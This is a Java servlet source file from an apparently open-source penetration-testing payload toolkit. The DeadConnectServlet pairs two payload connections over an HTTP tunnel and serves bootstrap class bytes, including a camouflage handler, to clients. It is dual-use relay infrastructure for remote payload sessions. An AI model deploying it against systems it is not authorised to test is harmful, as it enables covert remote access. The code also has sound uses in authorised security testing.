/*
 * J2EE Payloads.
 * 
 * Copyright (c) 2012 Michael 'mihi' Schierl
 * All rights reserved.
 * 
 * Redistribution and use in source and binary forms, with or without
 * modification, are permitted provided that the following conditions
 * are met:
 * 
 * - Redistributions of source code must retain the above copyright notice,
 *   this list of conditions and the following disclaimer.
 *   
 * - Redistributions in binary form must reproduce the above copyright
 *   notice, this list of conditions and the following disclaimer in the
 *   documentation and/or other materials provided with the distribution.
 *   
 * - Neither name of the copyright holders nor the names of its
 *   contributors may be used to endorse or promote products derived from
 *   this software without specific prior written permission.
 *   
 * THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND THE CONTRIBUTORS
 * "AS IS" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT
 * LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR
 * A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT
 * HOLDERS OR THE CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT,
 * INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING,
 * BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS
 * OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND
 * ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR
 * TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE
 * USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
 */
package j2eepayload.servlet;

import java.io.ByteArrayOutputStream;
import java.io.DataOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.io.PipedInputStream;
import java.io.PipedOutputStream;
import java.net.InetAddress;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;
import java.util.Map;

import javapayload.stage.StreamForwarder;

import javax.servlet.ServletException;
import javax.servlet.ServletOutputStream;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;

import jtcpfwd.util.PollingHandler;
import jtcpfwd.util.http.HTTPTunnelEngine;
import jtcpfwd.util.http.PollingHandlerFactory;
import jtcpfwd.util.http.StreamingHTTPTunnelEngine;

public class DeadConnectServlet extends HttpServlet implements PollingHandlerFactory {

	private static final String USAGE_MESSAGE = "<h1>JavaPayload DeadConnect Servlet</h1><b>Use the <tt>ConnectURI</tt> payload (twice) to connect to this servlet.</p>";
	private static final long serialVersionUID = 1L;
	private static final Map/*<String,List<Object[]>>*/ unpairedConnections = new HashMap();

	protected HTTPTunnelEngine engine;

	public void init() {
		engine = new StreamingHTTPTunnelEngine(this);
	}
	
	public PollingHandler createHandler(InetAddress remoteAddress, ServletOutputStream out, String createParam) throws Exception {
		if (createParam == null || createParam.length() < 2 || "hs".indexOf(createParam.charAt(0)) == -1) {
			out.println(USAGE_MESSAGE);
			out.flush();
			return null;
		}
		String lookupParam = (createParam.startsWith("h") ? "s" : "h") + createParam.substring(1);
		Object[] toPair = null;
		synchronized(unpairedConnections) {
			List/*<Object[]*/ conns = (List)unpairedConnections.get(lookupParam);
			if (conns != null) {
				toPair = (Object[]) conns.remove(0);
				if (conns.size() == 0)
					unpairedConnections.remove(lookupParam);
			}
		}
		PollingHandler handler;
		if (toPair != null) {
			 handler = new PollingHandler((OutputStream)toPair[0], 1048576);
			 new StreamForwarder((InputStream)toPair[1], handler, System.err).start();
		} else {
			PipedOutputStream pos = new PipedOutputStream();
			handler = new PollingHandler(pos, 1048576);
			synchronized(unpairedConnections) {
				List/*<Object[]*/ conns = (List)unpairedConnections.get(createParam);
				if (conns == null) {
					conns = new ArrayList();
					unpairedConnections.put(createParam, conns);
				}
				conns.add(new Object[] {handler, new PipedInputStream(pos)});
			}			
		}

		return handler;
	}
	
	protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {
		if (request.getParameter("bs") != null) {
			Class[] classesToPush = new Class[] {
					jtcpfwd.util.PollingHandler.class,
					jtcpfwd.util.PollingHandler.OutputStreamHandler.class,
					jtcpfwd.util.http.HTTPTunnelClient.class,
					jtcpfwd.util.http.HTTPTunnelClient.HTTPSender.class,
					jtcpfwd.util.http.HTTPTunnelClient.HTTPReceiver.class,
					jtcpfwd.util.http.HTTPTunnelClient.CamouflageHandler.class,
					j2eepayload.servlet.DeadConnectClientHelper.class,
			};
			response.setContentType("application/x-bootstrap");
			DataOutputStream out = new DataOutputStream(response.getOutputStream());
			for (int i = 0; i < classesToPush.length; i++) {
				final InputStream classStream = classesToPush[i].getResourceAsStream("/" + classesToPush[i].getName().replace('.', '/') + ".class");
				final ByteArrayOutputStream baos = new ByteArrayOutputStream();
				StreamForwarder.forward(classStream, baos);
				final byte[] clazz = baos.toByteArray();
				out.writeInt(clazz.length);
				out.write(clazz);
			}
			out.writeInt(0);
			out.flush();
			response.flushBuffer();
		} else if (!engine.doGet(request, response)) {
			response.getOutputStream().println(USAGE_MESSAGE);
		}
	}

	protected void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {
		engine.doPost(request, response);
	}
}
